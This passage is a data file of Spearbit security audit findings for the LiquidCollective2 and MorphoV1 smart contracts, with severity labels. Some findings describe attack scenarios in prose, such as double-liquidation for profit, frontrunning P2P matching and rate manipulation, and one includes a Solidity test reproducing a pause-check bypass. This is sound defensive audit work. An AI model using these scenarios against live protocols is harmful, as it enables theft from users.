        "body": "The IVestingScheduleManager interface contains all ERC20VestableVotesUpgradeableV1 needs to implement and use. the events, errors, and functions that Because there's no corresponding VestingScheduleManager contract implementation, it would make sense to rename the interface to IERC20VestableVotesUpgradeableV1.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider renaming CoverageFundAddress COVERAGE_FUND_ADDRESS to be consistent with the current naming convention",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "Consider renaming the constant used to access the unstructured storage slot COVERAGE_FUND_- ADDRESS. To follow the naming convention already adopted across all the contracts, the variable should be renamed to COVERAGE_FUND_ADDRESS_SLOT.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider reverting if the msg.value is zero in CoverageFundV1.donate",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "In the current implementation of CoverageFundV1.donate there is no check on the msg.value value. Because of this, the sender can \"spam\" the function and emit multiple useless Donate events.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider having a separate function in River contract that allows CoverageFundV1 to send funds instead of using the same function used by ELFeeRecipientV1",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "When the River contract calls the CoverageFundV1 contract to pull funds, the CoverageFundV1 sends funds to River by calling IRiverV1(payable(river)).sendELFees{value: amount}();. sendELFees is a function that is currently used by both CoverageFundV1 and ELFeeRecipientV1. function sendELFees() external payable { if (msg.sender != ELFeeRecipientAddress.get() && msg.sender != CoverageFundAddress.get()) { revert LibErrors.Unauthorized(msg.sender); } } It would be cleaner to have a separate function callable only by the CoverageFundV1 contract.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Extensively document how the Coverage Funds contract works",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "The Coverage Fund contract has a crucial role inside the Protocol, and the current contract's docu- mentation does not properly cover all the needed aspects. Consider documenting the following aspects:  General explanation of the Coverage Funds and it's purpose.  Will donations happen only after a slash/penalty event? Or is there a \"budget\" that will be dumped on the contract regardless of any slashing events?  If a donation of XXX ETH is made, how is it handled? In a single transaction or distributed over a period of time?  Explain carefully that when ETH is donated, no shares are minted.  Explain all the possible market repercussions of the integration of Coverage Funds.  Is there any off-chain validation process before donating? 29  Who are the entities that are enabled to donate to the fund?  How is the Coverage Funds integrated inside the current Alluvial protocol?  Any additional information useful for the users, investors, and other actors that interact with the protocol.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing/wrong natspec comment and typos",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": " Natspec  Missing part of the natspec comment for /// @notice Attempt to revoke at a relative to InvalidRevokedVestingScheduleEnd in IVestingScheduleManager  Natspec missing the @return part for getVestingSchedule in IVestingScheduleManager.  Wrong order of natspec @param for createVestingSchedule in IVestingScheduleManager. The @param _beneficiary should be placed before @param _delegatee to follow the function signature order.  Natspec missing the @return part for delegateVestingEscrow in IVestingScheduleManager.  Wrong natspec comment, operators should be replaced with vesting schedules for @custom:attribute of struct SlotVestingSchedule in VestingSchedules. 30  Wrong natspec parameter, replace operator with vesting schedule in the VestingSchedules.push func- tion.  Missing @return natspec for _delegateVestingEscrow in ERC20VestableVotesUpgradeable.  Missing @return natspec for _deterministicVestingEscrow in ERC20VestableVotesUpgradeable.  Missing @return natspec for _getCurrentTime in ERC20VestableVotesUpgradeable.  Add the Coverage Funds as a source of \"extra funds\" in the Oracle._pushToRiver natspec documentation in Oracle.  Update the InvalidCall natspec in ICoverageFundV1 given that the error is thrown also in the receive() external payable function of CoverageFundV1.  Update the natspec of struct VestingSchedule lockDuration attribute in VestingSchedules by explaining that the lock duration of a vesting schedule could possibly exceed the overall duration of the vesting.  Update the natspec of lockDuration in ERC20VestableVotesUpgradeable by explaining that the lock dura- tion of a vesting schedule could possibly exceed the overall duration of the vesting.  Consider making the natspec documentation of struct VestingSchedule in VestingSchedules and the natspec in ERC20VestableVotesUpgradeable be in sync.  Add more examples (variations) to the natspec documentation of the vesting schedules example in ERC20VestableVotesUpgradeable to explain all the possible combination of scenarios.  Make the ERC20VestableVotesUpgradeable natspec documentation about the vesting schedule consis- tent with the natspec documentation of _createVestingSchedule and VestingSchedules struct Vest- ingSchedule.  Typos  Replace all Overriden instances with Overridden in River.  Replace transfer with transfers in ERC20VestableVotesUpgradeable.1.sol#L147.  Replace token with tokens in ERC20VestableVotesUpgradeable.1.sol#L156.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Different behavior between River _pullELFees and _pullCoverageFunds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "Both _pullELFees and _pullCoverageFunds implement the same functionality:  Pull funds from a contract address.  Update the balance storage variable.  Emit an event.  Return the amount of balance collected from the contract. The _pullCoverageFunds differs from the _pullELFees implementation by avoiding both updating the Balance- ToDeposit when collectedCoverageFunds == 0 and emitting the PulledCoverageFunds event. Because they are implementing the same functionality, they should follow the same behavior if there is not an explicit reason to not do so. 31",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Move local mask variable from Allowlist.1.sol to LibAllowlistMasks.sol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "LibAllowlistMasks.sol is meant to contain all mask values, but DENY_MASK is a local variable in the Allowlist.1.sol contract.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider adding additional parameters to the existing events to improve filtering/monitoring",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "Some already defined events could be improved by adding more parameters to better track those events in dApps or monitoring tools.  Consider adding address indexed delegatee as an event's parameter to event CreatedVestingSchedule. While it's true that after the vest/lock period the beneficiary will be the owner of those tokens, in the meanwhile (if _delegatee != address(0)) the voting power of all those vested tokens are delegated to the _delegatee.  Consider adding address indexed beneficiary to event ReleasedVestingSchedule.  Consider adding uint256 newEnd to event RevokedVestingSchedule to track the updated end of the vesting schedule.  Consider adding address indexed beneficiary to event DelegatedVestingEscrow. If those events parameters are added to the events, the Alluvial team should also remember to update the relative natspec documentation.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing indexed keyword in events parameters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "Some events parameters are missing the indexed keyword. Indexing specific parameters is partic- ularly important to later be able to filter those events both in dApps or monitoring tools.  coverageFund event parameter should be declared as indexed in event SetCoverageFund.  Both oldDelegatee and newDelegatee should be indexed in event DelegatedVestingEscrow.  donator should be declared as indexed in event Donate.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Add natspec documentation to the TLC contract",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "The current implementation of TLC contract is missing natspec at the root level to explain the contract. The natspec should cover the basic explanation of the contract (like it has already been done in other contracts like River.sol) but also illustrate  TLC token has a fixed max supply that is minted at deploy time.  All the minted tokens are sent to a single account at deploy time.  How TLC token will be distributed.  How voting power works (you have to delegate to yourself to gain voting power).  How the vesting process works.  Other general information useful for the user/investor that receives the TLC token directly or vested.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Liquidating Morpho's Aave position leads to state desync",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "Morpho has a single position on Aave that encompasses all of Morpho's individual user positions that are on the pool. When this Aave Morpho position is liquidated the user position state tracked in Morpho desyncs from the actual Aave position. This leads to issues when users try to withdraw their collateral or repay their debt from Morpho. It's also possible to double-liquidate for a profit. Example: There's a single borrower B1 on Morpho who is connected to the Aave pool. B1 supplies 1 ETH and borrows 2500 DAI. This creates a position on Aave for Morpho The ETH price crashes and the position becomes liquidatable. A liquidator liquidates the position on Aave, earning the liquidation bonus. They repaid some debt and seized some collateral for profit. This repaid debt / removed collateral is not synced with Morpho. The user's supply and debt balance remain 1 ETH and 2500 DAI. The same user on Morpho can be liquidated again because Morpho uses the exact same liquidation parameters as Aave. The Morpho liquidation call again repays debt on the Aave position and withdraws collateral with a second liquidation bonus. The state remains desynced.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: High Risk"
        ]
    },
    {
        "title": "A market could be deprecated but still prevent liquidators to liquidate borrowers if isLiquidateBor- rowPaused is true",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "Currently, when a market must be deprecated, Morpho checks that borrowing has been paused before applying the new value for the flag. function setIsDeprecated(address _poolToken, bool _isDeprecated) external onlyOwner isMarketCreated(_poolToken) { } if (!marketPauseStatus[_poolToken].isBorrowPaused) revert BorrowNotPaused(); marketPauseStatus[_poolToken].isDeprecated = _isDeprecated; emit IsDeprecatedSet(_poolToken, _isDeprecated); The same check should be done in isLiquidateBorrowPaused, allowing the deprecation of a market only if isLiq- uidateBorrowPaused == false otherwise liquidators would not be able to liquidate borrowers on a deprecated market.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "setIsPausedForAllMarkets bypass the check done in setIsBorrowPaused and allow resuming borrow on a deprecated market",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The MorphoGovernance contract allow Morpho to set the isBorrowPaused to false only if the market is not deprecated. function setIsBorrowPaused(address _poolToken, bool _isPaused) external onlyOwner isMarketCreated(_poolToken) { } if (!_isPaused && marketPauseStatus[_poolToken].isDeprecated) revert MarketIsDeprecated(); marketPauseStatus[_poolToken].isBorrowPaused = _isPaused; emit IsBorrowPausedSet(_poolToken, _isPaused); This check is not enforced by the _setPauseStatus function, called by setIsPausedForAllMarkets allowing Mor- pho to resume borrowing for deprecated market. Test to reproduce the issue // SPDX-License-Identifier: AGPL-3.0-only pragma solidity ^0.8.0; import \"./setup/TestSetup.sol\"; contract TestSpearbit is TestSetup { using WadRayMath for uint256; function testBorrowPauseCheckSkipped() public { // Deprecate a market morpho.setIsBorrowPaused(aDai, true); morpho.setIsDeprecated(aDai, true); checkPauseEquality(aDai, true, true); // you cannot resume the borrowing if the market is deprecated hevm.expectRevert(abi.encodeWithSignature(\"MarketIsDeprecated()\")); morpho.setIsBorrowPaused(aDai, false); checkPauseEquality(aDai, true, true); // but this check is skipped if I call directly `setIsPausedForAllMarkets` morpho.setIsPausedForAllMarkets(false); // this should revert because // you cannot resume borrowing for a deprecated market checkPauseEquality(aDai, false, true); } function checkPauseEquality( address aToken, bool shouldBePaused, 6 bool shouldBeDeprecated ) public { ( bool isSupplyPaused, bool isBorrowPaused, bool isWithdrawPaused, bool isRepayPaused, bool isLiquidateCollateralPaused, bool isLiquidateBorrowPaused, bool isDeprecated ) = morpho.marketPauseStatus(aToken); assertEq(isBorrowPaused, shouldBePaused); assertEq(isDeprecated, shouldBeDeprecated); } }",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "User withdrawals can fail if Morpho position is close to liquidation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "When trying to withdraw funds from Morpho as a P2P supplier the last step of the withdrawal algorithm borrows an amount from the pool (\"hard withdraw\"). If the Morpho position on Aave's debt / collateral value is higher than the market's max LTV ratio but lower than the market's liquidation threshold, the borrow will fail and the position can also not be liquidated. The withdrawals could fail.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "P2P borrowers' rate can be reduced",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "Users on the pool currently earn a much worse rate than users with P2P credit lines. There's a queue for being connected P2P. As this queue could not be fully processed in a single transaction the protocol introduces the concept of a max iteration count and a borrower/supplier \"delta\" (c.f. yellow paper). This delta leads to a worse rate for existing P2P users. An attacker can force a delta to be introduced, leading to worse rates than before. Example: Imagine some borrowers are matched P2P (earning a low borrow rate), and many are still on the pool and therefore in the pool queue (earning a worse borrow rate from Aave).  An attacker supplies a huge amount, creating a P2P credit line for every borrower. (They can repeat this step several times if the max iterations limit is reached.) 7  The attacker immediately withdraws the supplied amount again. The protocol now attempts to demote the borrowers and reconnect them to the pool. But the algorithm performs a \"hard withdraw\" as the last step if it reaches the max iteration limit, creating a borrower delta. These are funds borrowed from the pool (at a higher borrowing rate) that are still wrongly recorded to be in a P2P position for some borrowers. This increase in borrowing rate is socialized equally among all P2P borrowers. (reflected in an updated p2pBorrowRate as the shareOfDelta increased.)  The initial P2P borrowers earn a worse rate than before. If the borrower delta is large, it's close to the on-pool rate.  If an attacker-controlled borrower account was newly matched P2P and not properly reconnected to the pool (in the \"demote borrowers\" step of the algorithm), they will earn a better P2P rate than the on-pool rate they earned before.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Medium Risk Original"
        ]
    },
    {
        "title": "Frontrunners can exploit system by not allowing head of DLL to match in P2P",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "For a given asset x, liquidity is supplied on the pool since there are not enough borrowers. suppli- ersOnPool head: 0xa with 1000 units of x whenever there is a new transaction in the mempool to borrow 100 units of x,  Frontrunner supplies 1001 units of x and is supplied on pool.  updateSuppliers will put the frontrunner on the head (assuming very high gas is supplied).  Borrower's transaction lands and is matched 100 units of x with a frontrunner in p2p.  Frontrunner withdraws the remaining 901 left which was on the underlying pool. Favorable conditions for an attack:  Relatively fewer gas fees & relatively high block gas limit.  insertSorted is able to traverse to head within block gas limit (i.e length of DLL). Since this is a non-atomic sandwich, the frontrunner needs excessive capital for a block's time period.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Differences between Morpho and Compound borrow validation logic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. By reviewing both logic, we have noticed that there are some differences between them;  Compound has a mechanism to prevent borrows if the new borrowed amount would go above the current borrowCaps[cToken] threshold. Morpho does not check this threshold and could allow users to borrow on the P2P side (avoiding the revert because it would not trigger the underlying compound borrow action). Morpho should anyway monitor the borrowCaps of the market because it could make increaseP2PDeltasLogic and _unsafeWithdrawLogic reverts.  Both Morpho and Compound do not check if a market is in \"deprecated\" state. This means that as soon as a user borrows some tokens, he/she can be instantly liquidated by another user.  If the flag is true on Compound, the Morpho User can be liquidated directly on compound.  If the flag is true on Morpho, the borrower can be liquidated on Morpho.  Morpho does not check if borrowGuardianPaused[cToken] on Compound, a user could be able to borrow in P2P while the cToken market has borrow paused. More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Compound\".",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Users can continue to borrow from a deprecated market",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "When a market is being marked as deprecated, there is no verification that the borrow for that market has already been disabled. This means a user could borrow from this market and immediately be eligible to be liquidated.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "ERC20 with transfer's fee are not handled by *PositionManager",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "Some ERC20 tokens could have fees attached to the transfer event, while others could enable them in the future (see USDT, USDC). The current implementation of both PositionManager (for Aave and Compound) is not taking into consideration these types of ERC20 tokens. While Aave seems not to take into consideration this behavior (see LendingPool.sol), Compound, on the other hand, is explicitly handling it inside the doTransferIn function. Morpho is taking for granted that the amount specified by the user will be the amount transferred to the contract's balance, while in reality, the contract will receive less. In supplyLogic, for example, Morpho will account for the user's p2p/pool balance for the full amount but will repay/supply to the pool less than the amount accounted for.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Cannot liquidate Morpho users if no liquidity on the pool",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "Morpho implements liquidations by repaying the borrowed asset and then withdrawing the collateral If there is no liquidity in the collateral asset pool the asset from the underlying protocol (Aave / Compound). liquidation will fail. Morpho could incur bad debt as they cannot liquidate the user. The liquidation mechanisms of Aave and Compound work differently: They allow the liquidator to seize the debtorsTokens/cTokens which can later be withdrawn for the underlying token once there is enough liquidity in the pool. Technically, an attacker could even force no liquidity on the pool by frontrunning liquidations by borrowing the entire pool amount - preventing them from being liquidated on Morpho. However, this would require significant capital as collateral in most cases.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Supplying and borrowing can recreate p2p credit lines even if p2p is disabled",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "When supplying/borrowing the algorithm tries to reduce the deltas p2pBorrowDelta/p2pSupplyDelta by moving borrowers/suppliers back to P2P. It is not checked if P2P is enabled. This has some consequences related to when governance disables P2P and wants to put users and liquidity back on the pool through increaseDelta calls. The users could enter P2P again by supplying and borrowing.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "In Compound implementation, P2P indexes can be stale",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The current implementation of MorphoUtils._isLiquidatable loops through all of the tokens in which the user has supplied to/borrowed from. The scope of the function is to check whether the user can be liquidated or not by verifying that debtValue > maxDebtValue. Resolving \"Compound liquidity computation uses outdated cached borrowIndex\" implies that the Compound bor- row index used is always up-to-date but the P2P issues associated with the token could still be out of date if the market has not been used recently, and the underlying Compound indexes (on which the P2P index is based) has changed a lot. As a consequence, all the functions that rely on _isLiquidatable (liquidate, withdraw, borrow) could return a wrong result if the majority of the user's balance is on the P2P balance (the problem is even more aggravated without resolving \"Compound liquidity computation uses outdated cached borrowIndex\". Let's say, for example:  Alice supplies ETH in pool  Alice supplies BAT in P2P  Alice borrows some DAI At some point in time the ETH value goes down, but the interest rate of BAT goes up. If the P2P index of BAT had been correctly up-to-date, Alice would have been still solvent, but she gets liquidated by Bob who calls liq- uidate(alice, ETH, DAI) Even by fixing \"Compound liquidity computation uses outdated cached borrowIndex\" Alice would still be liquidated because her entire collateral is on P2P and not in the pool.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Turning off an asset as collateral on Morpho-Aave still allows seizing of that collateral on Morpho and leads to liquidations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The Morpho Aave deployment can set the asset to not be used as collateral for Aave's Morpho contract position. On Aave, this prevents liquidators from seizing this asset as collateral. 1. However, this prevention does not extend to users on Morpho as Morpho has not implemented this check. Liquidations are performed through a repay & withdraw combination and withdrawing the asset on Aave is still allowed. 2. When turning off the asset as collateral, the single Morpho contract position on Aave might still be over- collateralized, but some users on Morpho suddenly lose this asset as collateral (LTV becomes 0) and will be liquidated.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "claimToTreasury(COMP) steals users' COMP rewards",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The claimToTreasury function can send a market's underlying tokens that have been accumulated in the contract to the treasury. This is intended to be used for the reserve amounts that accumulate in the contract from P2P matches. However, Compound also pays out rewards in COMP and COMP is a valid Compound market. Sending the COMP reserves will also send the COMP rewards. This is especially bad as anyone can claim COMP rewards on the behalf of Morpho at any time and the rewards will be sent to the contract. An attacker could even frontrun a claimToTreasury(cCOMP) call with a Comptroller.claimComp(morpho, [cComp]) call to sabotage the reward system. Users won't be able to claim their rewards.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Compound liquidity computation uses outdated cached borrowIndex",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The _isLiquidatable iterates over all user-entered markets and calls _getUserLiquidity- DataForAsset(poolToken) -> _getUserBorrowBalanceInOf(poolToken). However, it only updates the indexes of markets that correspond to the borrow and collateral assets. The _getUserBorrowBalanceInOf function computes the underlying pool amount of the user as userBorrowBalance.onPool.mul(lastPoolIndexes[_- poolToken].lastBorrowPoolIndex);. Note that lastPoolIndexes[_poolToken].lastBorrowPoolIndex is a value that was cached by Morpho and it can be outdated if there has not been a user-interaction with that market for a long time. The liquidation does not match Compound's liquidation anymore and users might not be liquidated on Morpho that could be liquidated on Compound. Liquidators would first need to trigger updates to Morpho's internal borrow indexes.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "HeapOrdering.getNext returns the root node for nodes not in the list",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "If an id does not exist in the HeapOrdering the getNext() function will return the root node uint256 rank = _heap.ranks[_id]; // @audit returns 0 as rank. rank + 1 will be the root if (rank < _heap.accounts.length) return getAccount(_heap, rank + 1).id; else return address(0);",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Heap only supports balances up to type(uint96).max",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The current heap implementation packs an address and the balance into a single storage slot which If a token has 18 decimals, the largest restricts the balance to the uint96 type with a max value of ~7.9e28. balance that can be stored will be 7.9e10. This could lead to problems with a token of low value, for example, if 1.0 tokens are worth 0.0001$, a user could only store 7_900_000$.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Delta leads to incorrect reward distributions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "Delta describes the amount that is on the pool but still wrongly tracked as inP2P for some users. There are users that do not have their P2P balance updated to an equivalent pool balance and therefore do not earn rewards. There is now a mismatch of this delta between the pool balance that earns a reward and the sum of pool balances that are tracked in the reward manager to earn that reward. The increase in delta directly leads to an increase in rewards for all other users on the pool.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "When adding a new rewards manager, users already on the pool won't be earning rewards",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "When setting a new rewards manager, existing users that are already on the pool are not tracked and won't be earning rewards.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "liquidationThreshold computation can be moved for gas efficiency",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The vars.liquidationThreshold computation is only relevant if the user is supplying this asset. Therefore, it can be moved to the if (_isSupplying(vars.userMarkets, vars.borrowMask)) branch.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Add max approvals to markets upon market creation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "Approvals to the Compound markets are set on each supplyToPool function call.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "isP2PDisabled flag is not updated by setIsPausedForAllMarkets",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The current implementation of _setPauseStatus does not update the isP2PDisabled. When _- isPaused = false this is not a real problem because once all the flags are enabled (everything is paused), all the operations will be blocked at the root of the execution of the process. There might be cases instead where isP2PDisabled and the other flags were disabled for a market and Morpho want to enable all of them, resuming all the operations and allowing the users to continue P2P usage. In this case, Morpho would only resume operations without allowing the users to use the P2P flow. function _setPauseStatus(address _poolToken, bool _isPaused) internal { Types.MarketPauseStatus storage pause = marketPauseStatus[_poolToken]; pause.isSupplyPaused = _isPaused; pause.isBorrowPaused = _isPaused; pause.isWithdrawPaused = _isPaused; pause.isRepayPaused = _isPaused; pause.isLiquidateCollateralPaused = _isPaused; pause.isLiquidateBorrowPaused = _isPaused; // ... event emissions }",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Differences between Morpho and Aave liquidate validation logic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. By reviewing both logic, we have noticed that there are some differences between the logic Note: Morpho re-implements the liquidate function as a mix of  repay + supply operations on Aave executed inside _unsafeRepayLogic where needed  withdraw + borrow operations on Aave executed inside _unsafeWithdrawLogic where needed From _unsafeRepayLogic (repay + supply on pool where needed)  Because _unsafeRepayLogic internally call aave.supply the whole tx could fail in case the supplying has been disabled on Aave (isFrozen == true) for the _poolTokenBorrowed  Morpho is not checking that the Aave borrowAsset has isActive == true  Morpho do not check that remainingToRepay.rayDiv(poolIndexes[_poolToken].poolBorrowIndex) > 0. Trying to repay that amount to Aave would make the whole tx revert 16  Morpho do not check that remainingToSupply.rayDiv(poolIndexes[_poolToken].poolSupplyIndex) > 0. Trying to borrow that amount to Aave would make the whole tx revert From _unsafeWithdrawLogic (withdraw + borrow on pool where needed)  Because _unsafeWithdrawLogic internally calls aave.borrow the whole tx could fail in case the borrowing has been disabled on Aave (isFrozen == true or borrowingEnabled == false) for the _poolTokenCol- lateral  Morpho is not checking that the Aave collateralAsset has isActive == true  Morpho do not check that remainingToWithdraw.rayDiv(poolIndexes[_poolToken].poolSupplyIndex) > 0. Trying to withdraw that amount from Aave would make the whole tx revert  Morpho do not check that remainingToBorrow.rayDiv(poolIndexes[_poolToken].poolBorrowIndex) > 0. Trying to borrow that amount from Aave would make the whole tx revert More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Aave\".",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Differences between Morpho and Aave repay validation logic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. By reviewing both logic, we have noticed that there are some differences between the logic Note: Morpho re-implement the repay function as a mix of repay + supply operations on Aave where needed  Both Aave and Morpho are not handling ERC20 token with fees on transfer  Because _unsafeRepayLogic internally call aave.supply the whole tx could fail in case the supplying has been disabled on Aave (isFrozen == true)  Morpho is not checking that the Aave market has isActive == true  Morpho do not check that remainingToRepay.rayDiv(poolIndexes[_poolToken].poolBorrowIndex) > 0. Trying to repay that amount to Aave would make the whole tx revert  Morpho do not check that remainingToSupply.rayDiv(poolIndexes[_poolToken].poolSupplyIndex) > 0. Trying to supply that amount to Aave would make the whole tx revert More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Aave\".",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Differences between Morpho and Aave withdraw validation logic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
